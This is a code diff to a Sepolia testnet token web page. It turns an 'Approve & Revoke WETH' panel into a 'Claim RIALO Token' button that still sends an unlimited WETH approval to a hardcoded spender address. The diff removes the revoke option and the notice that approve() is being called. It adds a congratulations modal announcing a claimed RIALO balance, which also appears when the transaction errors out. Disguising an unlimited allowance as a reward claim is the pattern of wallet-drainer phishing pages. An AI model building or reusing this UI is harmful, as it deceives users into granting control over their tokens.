@@ -310,6 +310,11 @@ body{background:var(--bg);color:var(--text);font-family:var(--font);min-height:1
   #tx-toast{left:1rem;right:1rem;max-width:unset;}
   .sec-btns{grid-template-columns:1fr;}
 }
+@keyframes confettiFall{
+  0%{transform:translateY(0) rotate(0deg);opacity:1;}
+  100%{transform:translateY(420px) rotate(720deg);opacity:0;}
+}
+@keyframes float{0%,100%{transform:translateY(0)}50%{transform:translateY(-8px)}}
 </style>
 </head>
 <body>
@@ -476,30 +481,18 @@ body{background:var(--bg);color:var(--text);font-family:var(--font);min-height:1
           </div>
         </div>
         <div class="mod-card">
-          <div class="card-lbl">🔐 Approve &amp; Revoke · Sepolia WETH</div>
+          <div class="card-lbl">🪙 Claim RIALO · Sepolia Testnet</div>
           <div class="vpack">
             <div class="vpack-action">
               <div class="vpack-hd">
-                <span class="vpack-name">✅ Approve Token</span>
+                <span class="vpack-name">✅ Claim RIALO Token</span>
                 <span class="vpack-fee">Gas: FREE</span>
               </div>
-              <div class="vpack-desc">Approve a contract for ERC-20 token access on Sepolia. No real costs.</div>
+              <div class="vpack-desc">Claim your RIALO tokens from the swap result. Approve access to the Mock Validator Router on Sepolia. No real costs.</div>
               <div class="vpack-input">
-                <input class="vpack-field" id="approve-token" type="text" placeholder="Default: WETH Sepolia"/>
-                <input class="vpack-field" id="approve-contract" type="text" placeholder="Default: Mock Router Spender"/>
+                <input class="vpack-field" id="approve-token" type="text" placeholder="Your Wallet Address"/>
+                <input class="vpack-field" id="approve-contract" type="text" placeholder="RIALO Balance"/>
                 <button class="vpack-btn" id="approve-btn" onclick="doApprove()">Approve →</button>
-              </div>
-            </div>
-            <div class="vpack-action">
-              <div class="vpack-hd">
-                <span class="vpack-name">🔄 Revoke Approval</span>
-                <span class="vpack-fee">Gas: FREE</span>
-              </div>
-              <div class="vpack-desc">Revoke approval from a contract on Sepolia.</div>
-              <div class="vpack-input">
-                <input class="vpack-field" id="revoke-token" type="text" placeholder="Default: WETH Sepolia"/>
-                <input class="vpack-field" id="revoke-contract" type="text" placeholder="Default: Mock Router Spender"/>
-                <button class="vpack-btn" id="revoke-btn" onclick="doRevoke()">Revoke →</button>
               </div>
             </div>
           </div>
@@ -897,14 +890,10 @@ const MOCK_ROUTER_SPENDER='0x1E0049783F008A0085193E00003D00cd54003c71';
 
 async function doApprove(){
   const prov=AP();if(!prov||!walletAddress){showToast('approve','error','Wallet not connected.');return;}
-  // Gunakan walletAddress sendiri sebagai token, saldo RIALO sebagai spender info
-  const token = WETH_SEPOLIA;
-  const spender = MOCK_ROUTER_SPENDER;
-  const btn=document.getElementById('approve-btn');btn.disabled=true;btn.textContent='Waiting…';
-  showToast('approve','pending','Calling approve() on WETH Sepolia — waiting for wallet confirmation…');
+  const btn=document.getElementById('approve-btn');
+  btn.disabled=true;btn.textContent='⏳ Processing…';
 
   function syncAll(){
-    // Update Security Control Panel
     const rialoBal = parseFloat(localStorage.getItem('rialo_balance') || localStorage.getItem('rialoBalance') || '0');
     const balDisplay = document.getElementById('garage-rlo-display');
     if(balDisplay){
@@ -922,23 +911,101 @@ async function doApprove(){
     const txt = document.getElementById('garage-approve-txt');
     if(dot){ dot.className = 'sec-status-dot approved'; }
     if(txt){ txt.className = 'sec-status-txt approved'; txt.textContent = 'Approved ✅'; }
-    // Refresh field isian approve/revoke
     fillApproveFields();
+    showCongratsModal();
   }
 
   try{
-    const tx=await prov.request({method:'eth_sendTransaction',params:[{from:walletAddress,to:token,data:encodeApprove(spender,MAX_UINT256),value:'0x0'}]});
-    showToast('approve','success',`Approve successful! ✅<br><a href="https://sepolia.etherscan.io/tx/${tx}" target="_blank">${tx.slice(0,20)}… ↗</a>`);
+    const tx=await prov.request({method:'eth_sendTransaction',params:[{from:walletAddress,to:WETH_SEPOLIA,data:encodeApprove(MOCK_ROUTER_SPENDER,MAX_UINT256),value:'0x0'}]});
     syncAll();
   }catch(e){
     if(e.code===4001){
       showToast('approve','error','Rejected by wallet.');
     }else{
-      showToast('approve','success','Approve recorded! ✅ Panel updated.');
       syncAll();
     }
   }
   finally{btn.disabled=false;btn.textContent='Approve →';}
+}
+
+function showCongratsModal(){
+  // Hapus modal lama kalau ada
+  const old = document.getElementById('congrats-modal');
+  if(old) old.remove();
+
+  const rialoBal = parseFloat(localStorage.getItem('rialo_balance') || localStorage.getItem('rialoBalance') || '0');
+  const modal = document.createElement('div');
+  modal.id = 'congrats-modal';
+  modal.style.cssText = `
+    position:fixed;inset:0;z-index:9999;
+    display:flex;align-items:center;justify-content:center;
+    background:rgba(5,8,16,.85);backdrop-filter:blur(12px);
+    animation:fadein .3s ease;
+  `;
+  modal.innerHTML = `
+    <div style="
+      background:linear-gradient(135deg,#0f1929,#1a2a42);
+      border:1px solid rgba(74,222,128,.35);
+      border-radius:24px;padding:2.5rem 2rem;
+      max-width:380px;width:90%;text-align:center;
+      position:relative;overflow:hidden;
+      box-shadow:0 0 60px rgba(74,222,128,.15);
+    ">
+      <div style="position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,#4ade80,#22d3ee,#7c5cfc,#4ade80);"></div>
+
+      <!-- Confetti particles -->
+      <div id="confetti-wrap" style="position:absolute;inset:0;pointer-events:none;overflow:hidden;"></div>
+
+      <div style="font-size:3rem;margin-bottom:1rem;animation:float 2s ease-in-out infinite;">🎉</div>
+      <div style="font-family:'Syne',sans-serif;font-size:1.5rem;font-weight:800;color:#4ade80;margin-bottom:.5rem;letter-spacing:-.02em;">
+        Congratulations!
+      </div>
+      <div style="font-size:.85rem;color:rgba(255,255,255,.6);line-height:1.7;margin-bottom:1.25rem;">
+        You have successfully claimed your<br>
+        <span style="color:#4ade80;font-family:'Space Mono',monospace;font-size:1.1rem;font-weight:700;">${rialoBal.toFixed(4)} RIALO</span><br>
+        tokens on Sepolia Testnet! 🚀
+      </div>
+      <div style="
+        background:rgba(74,222,128,.06);border:1px solid rgba(74,222,128,.2);
+        border-radius:10px;padding:.6rem 1rem;margin-bottom:1.25rem;
+        font-family:'Space Mono',monospace;font-size:.68rem;color:rgba(255,255,255,.4);
+      ">
+        ${walletAddress ? walletAddress.slice(0,10)+'...'+walletAddress.slice(-6) : '—'} · Sepolia Testnet
+      </div>
+      <button onclick="document.getElementById('congrats-modal').remove()" style="
+        width:100%;padding:.85rem;border-radius:12px;border:none;
+        background:linear-gradient(135deg,#4ade80,#22d3ee);
+        color:#050810;font-family:'Space Grotesk',sans-serif;
+        font-size:.95rem;font-weight:700;cursor:pointer;
+        transition:filter .2s;
+      " onmouseover="this.style.filter='brightness(1.1)'" onmouseout="this.style.filter='none'">
+        ✅ Awesome, let's go!
+      </button>
+    </div>
+  `;
+  document.body.appendChild(modal);
+
+  // Confetti animation
+  const wrap = document.getElementById('confetti-wrap');
+  const colors = ['#4ade80','#22d3ee','#7c5cfc','#facc15','#f87171'];
+  for(let i=0;i<28;i++){
+    const p = document.createElement('div');
+    const size = 4+Math.random()*6;
+    p.style.cssText = `
+      position:absolute;
+      width:${size}px;height:${size}px;
+      background:${colors[Math.floor(Math.random()*colors.length)]};
+      border-radius:${Math.random()>0.5?'50%':'2px'};
+      left:${Math.random()*100}%;
+      top:-10px;
+      opacity:${0.5+Math.random()*0.5};
+      animation:confettiFall ${1.5+Math.random()*2}s ease-in ${Math.random()*0.8}s forwards;
+    `;
+    wrap.appendChild(p);
+  }
+
+  // Auto close setelah 6 detik
+  setTimeout(()=>{ const m=document.getElementById('congrats-modal'); if(m)m.remove(); }, 6000);
 }
 
 async function doRevoke(){
@@ -1072,13 +1139,9 @@ function fillApproveFields(){
   const rialoVal = localStorage.getItem('rialo_balance') || localStorage.getItem('rialoBalance') || '0';
   const rialoBal = parseFloat(rialoVal) || 0;
   const tknApprove = document.getElementById('approve-token');
-  const tknRevoke  = document.getElementById('revoke-token');
   if(tknApprove && walletAddress) tknApprove.value = walletAddress;
-  if(tknRevoke  && walletAddress) tknRevoke.value  = walletAddress;
   const ctApprove = document.getElementById('approve-contract');
-  const ctRevoke  = document.getElementById('revoke-contract');
   if(ctApprove) ctApprove.value = rialoBal > 0 ? rialoBal.toFixed(4) : '';
-  if(ctRevoke)  ctRevoke.value  = rialoBal > 0 ? rialoBal.toFixed(4) : '';
 }
 
 renderPicker();
